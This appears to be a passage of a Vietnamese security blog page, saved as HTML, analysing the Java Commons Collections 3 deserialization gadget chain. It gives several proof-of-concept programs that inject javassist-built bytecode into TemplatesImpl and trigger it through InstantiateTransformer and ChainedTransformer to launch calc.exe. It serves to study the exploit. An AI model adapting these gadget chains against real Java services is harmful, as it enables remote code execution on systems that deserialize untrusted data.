@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="canonical" href="https://rayinaw.github.io/2023/03/20/commonscollections3-md/">
+  <link rel="icon" href="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <title>Phân tích chuỗi Commons Collections 3 | Rayinaw</title>
+  <meta name="author" content="Rayinaw">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index,follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="format-detection" content="telphone=no, email=no">
+  
+    <meta name="keywords" content="Commons Collections, Deserialization, Java">
+  
+  <meta name="description" content="Một vài kiến thức cần nắmTrước khi vào bài viết chúng ta cần nắm một số kiến thức sau:  javassist ChainedTransformer  Các chain sau thường có rất nhiều hướng để kết hợp. Môi trường JDK8u65 Commons-Col">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phân tích chuỗi Commons Collections 3">
+<meta property="og:url" content="https://rayinaw.github.io/2023/03/20/CommonsCollections3-md/index.html">
+<meta property="og:site_name" content="Rayinaw">
+<meta property="og:description" content="Một vài kiến thức cần nắmTrước khi vào bài viết chúng ta cần nắm một số kiến thức sau:  javassist ChainedTransformer  Các chain sau thường có rất nhiều hướng để kết hợp. Môi trường JDK8u65 Commons-Col">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+<meta property="article:published_time" content="2023-03-20T14:46:42.000Z">
+<meta property="article:modified_time" content="2023-03-22T12:16:21.617Z">
+<meta property="article:author" content="Rayinaw">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Deserialization">
+<meta property="article:tag" content="Commons Collections">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <!-- 站点验证相关 -->
+  
+    
+      <meta name="google-site-verification" content="aI3yWWy1IiiYpszN7ZglYDMHV2_A2mRNPujhnK6q8uA">
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all">
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)">
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night.min.css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all">
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/rss2.xml" title="Rayinaw" type="application/rss+xml">
+</head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                                
+                                                    
+                                                        
+                                                                <li>
+                                                                    <a href="/">
+                                                                        <i class="fa fa-home"></i>Trang chủ
+                                                                    </a>
+                                                                </li>
+                                                                
+                                                                    
+                                                        
+                                                                <li>
+                                                                    <a href="/archives/">
+                                                                        <i class="fa fa-book"></i>Kho lưu trữ
+                                                                    </a>
+                                                                </li>
+                                                                
+                                                                    
+                                                        
+                                                                <li>
+                                                                    <a href="/about/">
+                                                                        <i class="fa fa-paper-plane"></i>Về mình
+                                                                    </a>
+                                                                </li>
+                                                                
+                                                                    
+                                                                        
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo">
+                        <a href="/">
+                            Rayinaw
+                        </a>
+                    </div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>
+                            Rayinaw
+                        </h2> <br>
+                        <span>Nơi mình ghi chú lại những thứ đã học.</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://rayinaw.github.io/2023/03/20/CommonsCollections3-md/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">Phân tích chuỗi Commons Collections 3</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2023-03-20T14:46:42.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2023-03-20</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> Tác giả <span itemprop="name">Rayinaw</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~22.83K
+                    
+                    từ
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>Bài viết này được chỉnh sửa lần cuối vào <time datetime="1679487381617"></time> trước, và có thể cần cập nhật。</p></div>
+            </div>
+            
+            
+            
+                <div class="kratos-post-inner-toc toc-div-class">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mot-vai-kien-thuc-can-nam"><span class="toc-number">1.</span> <span class="toc-text">Một vài kiến thức cần nắm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Moi-truong"><span class="toc-number">2.</span> <span class="toc-text">Môi trường</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phan-tich"><span class="toc-number">3.</span> <span class="toc-text">Phân tích</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InstaniateTransformer"><span class="toc-number">3.1.</span> <span class="toc-text">InstaniateTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ChainedTransformed"><span class="toc-number">3.2.</span> <span class="toc-text">ChainedTransformed</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ChainedTransformed-TransformedMap"><span class="toc-number">3.3.</span> <span class="toc-text">ChainedTransformed + TransformedMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ChainedTransformed-LazyMap"><span class="toc-number">3.4.</span> <span class="toc-text">ChainedTransformed + LazyMap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Loi-ket"><span class="toc-number">4.</span> <span class="toc-text">Lời kết</span></a></li></ol>
+                </div>
+            
+            <hr>
+            <div itemprop="articleBody"><h2 id="Mot-vai-kien-thuc-can-nam"><a href="#Mot-vai-kien-thuc-can-nam" class="headerlink" title="Một vài kiến thức cần nắm"></a>Một vài kiến thức cần nắm</h2><p>Trước khi vào bài viết chúng ta cần nắm một số kiến thức sau:</p>
+<ul>
+<li>javassist</li>
+<li>ChainedTransformer</li>
+</ul>
+<p>Các chain sau thường có rất nhiều hướng để kết hợp.</p>
+<h2 id="Moi-truong"><a href="#Moi-truong" class="headerlink" title="Môi trường"></a>Môi trường</h2><ul>
+<li>JDK8u65</li>
+<li>Commons-Collections 3.2.1<br>Thêm Commons-Collections 3.2.1 vào project bằng dependencies (pom.xml file):<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h2><p>Sơ đồ tóm tắt chuỗi.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/mindmap.png"></p>
+<p>CC2, CC3, CC4 đều được xây dựng dựa trên TemplateImpl. Mình đã xây dựng phần này ở bài viết về cc3, nên bài này mình sẽ sử dụng lại nó.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">	TemplatesImpl.getTransletInstance()</span><br><span class="line">		TemplatesImpl.defineTransletClasses()</span><br><span class="line">			TransletClassLoader.defineClass()</span><br><span class="line">				TemplatesImpl.getTransletInstance()-&gt;_class[_transletIndex].newInstance()</span><br><span class="line">					Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>Đoạn code trigger lớp TemplatesImpl:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ở CC2, chúng ta lợi dụng thực thi hàm <code>newTransformer</code> thông qua <code>InvokerTransformer.newTransform()</code>. Còn với CC3 là gì thì chúng ta cùng nhau đi tiếp nào.</p>
+<p><img src="/.io//TemplateImplNewTransform.png"></p>
+<p>Tìm kiếm ta thấy có lớp TrAXFilter gọi đến nó ở trong hàm tạo.</p>
+<p><img src="/.io//TrAXFilter.png"></p>
+<p>Đi đến hàm tạo của TrAXFilter phân tích một chút (phân tích trước chứ có cái có thể không xài nhé):</p>
+<ul>
+<li><code>_templates</code> là một instance của interface <code>Templates</code> -&gt; <code>_templates</code> có thể là những lớp implements <code>Templates</code> (VD TemplatesImpl)</li>
+<li><code>_transformer</code> là một instance của class <code>TransformerImpl</code> và ở đây nó có thực thi <code>_transformer = (TransformerImpl) templates.newTransformer();</code> -&gt; Tìm class tạo ra TrAXFilter để nó thực thi hàm tạo.</li>
+</ul>
+<h3 id="InstaniateTransformer"><a href="#InstaniateTransformer" class="headerlink" title="InstaniateTransformer"></a>InstaniateTransformer</h3><p>Theo chain này, chúng ta sẽ dùng lớp <code>InstaniateTransformer</code> để tạo <code>TrAXFilter</code> ở hàm transform.</p>
+<p><img src="/.io//InstaniateTransformerTransform.png"></p>
+<p>Ở đây thì cũng khá dễ hiểu, trước tiên nó check Object mình truyền vào có phải là instance Class hay không, vậy thì chúng ta phải truyền Object loại khác với Class.</p>
+<p>Tiếp theo hàm này sử dụng reflection để tạo instance của một lớp nào đó. Mình sẽ phân tích rõ như sau:</p>
+<ul>
+<li><code>Constructor con = ((Class) input).getConstructor(iParamTypes);</code><ul>
+<li><code>con</code> là constructer của <code>input</code> truyền vào hàm transform.</li>
+<li><code>iParamTypes</code> là mảng các kiểu dữ liệu truyền vào constructor của lớp <code>TrAXFilter</code></li>
+<li><code>iArgs</code> là mảng các tham số truyền vào constructor.</li>
+</ul>
+</li>
+<li>Sau đó nó tạo instance của class cần tạo bằng <code>con.newInstance(iArgs)</code></li>
+</ul>
+<p>Nhìn vào hàm tạo của <code>InstantiateTransformer</code> để xem các biến <code>iParamTypes</code>, <code>iArgs</code> được tạo như nào:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Tóm gọn lại ý tưởng đến lúc này:<br>    * Ta có <code>templates</code> là instance của <code>TemplateImpl</code> cần thực thi <code>newTransformer()</code><br>    * Tạo một instace của <code>InstantiateTransformer</code> với <code>paramTypes</code> là mảng chứa kiểu Class của tham số truyền vào constructor <code>TrAXFilter</code> (new Class[]{Templates.class}). <code>args</code> là mảng chứa tham số cần truyền vào constructor của <code>TrAXFilter</code> (new Object[]{templates})<br>    * Thực thi <code>instantiateTransformer.transform(TrAXFilter.class)</code></p>
+<p>Từ đây ta có một POC nhỏ như sau:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ChainedTransformed"><a href="#ChainedTransformed" class="headerlink" title="ChainedTransformed"></a>ChainedTransformed</h3><p>Tương tự như <code>InvokerTransformer.transform</code>, <code>InstantiateTransformer</code> implements Transformer nên thằng này có thể cho vào <code>ChainedTransformed</code>.<br>Lợi ích của việc này như ở cc1-TransformedMap mình đã nói đó là chúng ta có thể trực tiếp thực thi mà không cần điều khiển đầu vào của hàm <code>transform()</code> bằng cách sử dụng <code>ConstantTransformer</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Tương tự như cc1, các bạn có thể nhìn vào sơ đồ ở đầu bài viết, từ ChainedTransformed chúng ta có hai hướng đó là kết hợp với TransformedMap, hoặc Lazymap để tạo thành một chain.</p>
